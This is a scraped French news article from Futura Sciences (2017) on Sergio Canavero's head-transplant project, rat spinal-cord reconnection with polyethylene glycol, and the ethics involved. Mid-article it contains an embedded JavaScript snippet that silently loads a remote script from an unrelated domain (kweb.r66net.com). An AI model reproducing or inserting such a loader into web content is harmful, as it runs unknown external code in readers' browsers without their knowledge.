{"title": "Greffe de tete : un chirurgien se rapproche de son but en reconnectant la moelle epiniere de rats", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-19", "content": "Sergio Canavero, le chirurgien italien qui ambitionne de faire la premiere greffe de tete humaine, a sectionne et recolle la moelle epiniere de rats. Pour lui, cette experience reussie est une nouvelle avancee vers son but ultime. Ce qu'il faut retenir Le chirurgien Sergio Canavero souhaiterait realiser des greffes de tetes humaines. Au cours d'experiences sur des animaux, il a sectionne et reussi a reconnecter la moelle epiniere de rats. L'etude conclut qu'une section de la moelle epiniere est reversible, ce qui ouvre la porte a des traitements contre des paralysies chez l'Homme. Greffer une tete humaine sur un autre corps : une telle idee peut sembler a la fois barbare et farfelue. Pourtant c'est le projet nourri par Sergio Canavero, un neurochirurgien italien, en depit des nombreux obstacles techniques et ethiques qui se dressent devant lui. Certains pensent qu'une telle operation pourrait sauver des personnes souffrant de maladies mortelles.  Pour se rapprocher de son objectif, le medecin participe a des travaux sur des animaux. Dans une nouvelle etude parue dans la revue  CNS Neuroscience , il decrit, avec une equipe de scientifiques chinois, comment il est possible de sectionner et reconnecter la moelle epiniere de rongeurs.  Pour cela, l'equipe a utilise une substance particuliere : le  polyethylene  glycol (PEG), qui favorise la fusion de membranes cellulaires, et donc des fibres nerveuses. D'apres le  Busines Insider , des scientifiques ont deja utilise le PEG dans des experiences pour lier des  moelles epinieres  de chiens et obtenir un animal a deux tetes.  Sergio Canavero a fait des experiences similaires sur des rongeurs. Dans un article paru en avril dernier dans  CNS Neuroscience and Therapeutics , il decrit la  greffe  reussie d'une tete sur le corps d'un rat. Il aurait repete le protocole sur d'autres animaux et obtenu plusieurs rats a deux tetes qui ont vecu en moyenne 36 heures. Dans un article paru en avril 2017, les auteurs decrivent un rat sur lequel a ete greffee une deuxieme tete. (c) Li  et al., CNS Neuroscience & Therapeutics  2017                               Le PEG recolle la moelle epiniere sectionnee chez le rongeur Pour cette toute nouvelle etude, la moelle epiniere a ete sectionnee chez 15 rats. Neuf animaux ont ete traites avec du PEG pour guerir la blessure et six n'ont eu qu'une solution saline temoin. Le produit a ete administre a l'aide d'une seringue au point de section. Les deux groupes ont pris des antibiotiques pendant 72 heures.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Resultats : les rongeurs qui ont eu du PEG en traitement ont retrouve leurs fonctions motrices et pouvaient a nouveau marcher au bout de quatre semaines. En parallele, aucun rat temoin n'a retrouve ses fonctions motrices. Tous les rongeurs ont survecu un mois, sauf un qui est mort tot. Les auteurs en concluent qu'une section de la moelle epiniere est reversible, ce qui ouvre la  porte  a des traitements contre des paralysies chez l'Homme. Des progres ont ete faits recemment pour soigner des patients qui ont eu des lesions de la moelle epiniere grace a differentes techniques : exosquelettes, interfaces cerveau-machine, stimulations electriques... Mais ces methodes ne permettent pas de retablir toutes les fonctions sensorimotrices. Pour en savoir plus Greffe de tete sur le corps d'un mort : un patient est volontaire Article de Marie-Celine Jacquier paru le 31 aout 2016 Le neurochirurgien italien Sergio Canavero avait affirme en 2015 qu'une greffe de tete serait realisable en 2017. Aujourd'hui, un patient russe atteint d'une maladie grave se porte volontaire pour cette operation ethiquement discutable. Valery Spiridonov est un homme russe de 31 ans souffrant d'une  maladie genetique  rare et mortelle : la maladie de Werdnig-Hoffmann, qui se caracterise par une grave faiblesse musculaire et la degenerescence des  neurones moteurs . Il est volontaire pour fournir sa tete a l'operation envisagee par Sergio Canavero et Xiaoping Ren, un chirurgien chinois. Comme l'explique le neurochirurgien italien Sergio Canavero dans  The Atlantic , l'operation qui aurait 90 % de chances de reussite necessiterait 80 chirurgiens et couterait 10 millions de dollars. En janvier dernier, les deux medecins ont affirme avoir realise avec succes une greffe de tete chez le singe. Le chirurgien chinois est aussi l'auteur de plusieurs articles decrivant des  operations de greffe de tete chez la souris .  Article de Janlou Chaput paru le 01/07/2013 a 17:40 Le neurochirurgien italien Sergio Canavero affirme que d'ici deux ans, on pourra transplanter la tete d'un patient  tetraplegique , ou avec un  cancer  metastasique, sur le corps d'un mort. Impossible et farfelu ? L'experience a deja ete partiellement reussie sur des singes dans les annees 1970... La medecine devient-elle comparable a la mecanique  automobile  ? Lorsque les soins apportes ne suffisent plus a guerir, les pieces defaillantes sont remplacees lors de  transplantations , un procede toujours delicat qui tend a se democratiser. Les  succes  s'enchainent. En parallele, les chercheurs tentent d'eviter le recours aux donneurs, parfois incompatibles, mais essaient de recreer les organes entiers a l'aide de  cellules souches , bien que les processus n'en soient encore qu'a leurs balbutiements. Reste malgre tout un organe particulier, siege de notre pensee, qui semble exclu de ces considerations : le  cerveau , notre  ordinateur  central. Le creer artificiellement  in vitro  ne lui confererait pas les souvenirs et les traits caracteristiques associes a la personne. Alors que faire ? Une  greffe  ? Bien que l'idee paraisse saugrenue, elle est envisagee depuis bien des annees, et le neurochirurgien italien Sergio Canavero estime dans un article paru dans la revue  Surgical Neurology International  que le denouement est proche. Il l'affirme : d'ici deux ans, on pourra transferer la tete d'un etre humain sur le corps d'un autre grace au projet Heaven. Alors, greffe de tete ou de corps ? Le receveur gardant sa tete, il semble plus pertinent de parler de greffe de corps. Une greffe de corps deja realisee sur des singes Aussi fou que cela puisse paraitre, ces allegations reposent sur des faits scientifiques anciens. Le neurochirurgien americain Robert White (1925-2010) en est l'instigateur. Dans les annees 1960, il reussissait a  faire vivre un cerveau en dehors du corps  quelques heures. Il tenta egalement l'experience   in vivo  chez le  chien  : connecte au corps d'un animal, le  cerveau  continuait a vivre, meme si on ignore encore si la conscience avait egalement ete transplantee. La science rattrape peu a peu la fiction. Certes, nous n'en sommes pas encore a ranimer les morts comme l'a reussi le docteur Frankenstein dans le livre de Mary Shelley, mais on touche du doigt des fantasmes que seuls les romans pouvaient se permettre de traiter, comme transferer sa tete dans un autre corps. (c) Universal Studios, Wikipedia, DP                       Mais ses experiences les plus celebres ont porte sur des  primates . Dans les annees 1970, il est devenu celebre en transferant tout entiere la  tete d'un singe  sur le corps d'un autre. Cette premiere tentative a permis au greffe de ne vivre que quelques heures seulement, mais avec un peu de perfectionnement et de pratique, les animaux semblaient vivre plus longtemps, bien qu'on n'ait pu reellement le mesurer puisqu'ils finissaient euthanasies. Seul hic, et de taille : si les singes semblaient conscients et gardaient leurs sens en eveil, il etait impossible de  reconnecter les moelles epinieres  du donneur et du receveur. Ainsi, les primates etaient paralyses en dessous du cou. Robert White predisait donc que le jour ou l'on reussirait a connecter le tissu nerveux, la technique serait applicable a l'Homme. Un traitement pour des malades desesperes ? C'est desormais le cas, affirme Sergio Canavero. Le medecin turinois explique qu'en mettant en contact les deux extremites de moelle epiniere dans une solution composee de deux  polymeres  que sont le polyethylene glycol et le chitosane, il est possible de faire fusionner les  cellules nerveuses . Ce qui manquait a Robert White serait maintenant a notre portee. Le neurochirurgien italien prevoit de s'entrainer sur des singes, puis sur des cadavres humains, avant d'etre pret a tester le procede grandeur nature d'ici deux ans. Mais qui cela concernerait-il et comment l'operation se deroulerait-elle ? Cette greffe serait ouverte a des  patients tetraplegiques , ou des personnes atteintes d'une maladie mortelle ou fortement invalidante touchant des regions autres que la tete.  Cancereux  en phase terminale,  diabetiques  avances ou des patients ayant de multiples organes defaillants pourraient y pretendre. L'operation qui valait 10 millions Pour proceder, une centaine de personnes devraient travailler en parallele. Dans un premier temps, la tete du receveur est placee en hypothermie, a 15 degC, de maniere a diminuer le  metabolisme du cerveau  et limiter les degats le temps du transfert. On sectionne au niveau du cou les muscles, les vaisseaux sanguins, la  trachee  et l' oesophage , tout en prenant soin de garder la  thyroide . Juste a cote, une seconde equipe realise la meme operation sur un patient en etat de  mort cerebrale , dont le corps est intact et dont la carrure et le sexe correspondent a ceux du receveur. La tete est une region du corps tres particuliere puisqu'elle renferme le cerveau, un veritable ordinateur de bord qui centralise la grande majorite des fonctions, dont la conscience. Greffer une tete sur un corps revient un peu a dissocier le corps et l'esprit. (c) Mark Lythgoe et Chloe Hutton,  Wellcome Images , Flickr, CC by-nc-nd 2.0                       Une fois ces operations effectuees, la moelle epiniere est tranchee a l'aide d'une lame extremement fine, de maniere a abimer le moins possible le tissu nerveux. D'apres l'auteur, les degats seront minimes et de bien moins grande ampleur que ce qu'on retrouve chez les patients tetraplegiques. A ce stade, la tete est dans un etat dit de mort controlee. On la replace rapidement sur le corps du  donneur  et on reconnecte les moelles epinieres, en appliquant le traitement special a base de polymeres. Puis les vaisseaux, muscles et autres tuyaux sont branches. A l'aide d'un  traitement immunosuppresseur , le scientifique souhaite eviter le  rejet de greffe . A son reveil, le patient beneficie d'un suivi psychologique pour accepter son corps et d'une reeducation pour apprendre a s'en servir convenablement. Cout total estime : 10 millions d'euros. L'ethique au coeur du debat Est-ce credible ? Difficile a dire. D'ordinaire, les etudes les plus serieuses paraissent dans les revues les plus celebres, comme  Nature  ou  Science . Cette fois, le journal est moins prestigieux. L'article a-t-il ete propose ailleurs et rejete, ou l'auteur a-t-il deliberement choisi le  Surgical Neurology International , sachant que son article aurait une visibilite bien moindre ? Reelle ou pas, cette possibilite souleve des questions ethiques, auxquelles Sergio Canavero appelle a reflechir et a trouver les reponses adaptees. Les  lois de bioethique  n'avaient effectivement pas statue sur ce genre d'operations, tout simplement parce qu'elles ne paraissaient pas realistes. Se pose alors le probleme de la reproduction : en theorie, le systeme sexuel fonctionne, mais les  gametes  auront le patrimoine  genetique  du donneur, et non du receveur. D'autre part, des derives sont evidemment envisageables : si le traitement est normalement reserve a des patients malades en situation critique, sera-t-il possible d'empecher un milliardaire insatisfait de son corps d'en revetir un nouveau ? La question de la limite des donneurs disponibles reviendra ineluctablement sur la table, et il est fort probable qu'il faudra effectuer des choix dans la hierarchie des patients, comme c'est deja le cas pour les autres organes. En fin de compte, un probleme tordu, a en perdre la tete... La greffe d'organe revolutionnee par les cellules souches ?                       Chaque annee plus de 5.000 personnes beneficient d'une greffe d'organe en France. Ces patients sont soumis a un lourd traitement pour empecher le rejet suite a leur operation. Decouvrez en video et grace a Discovery Science une technique basee sur les cellules souches qui pourrait permettre de contrer ce probleme.                                       ", "theme": "sante"}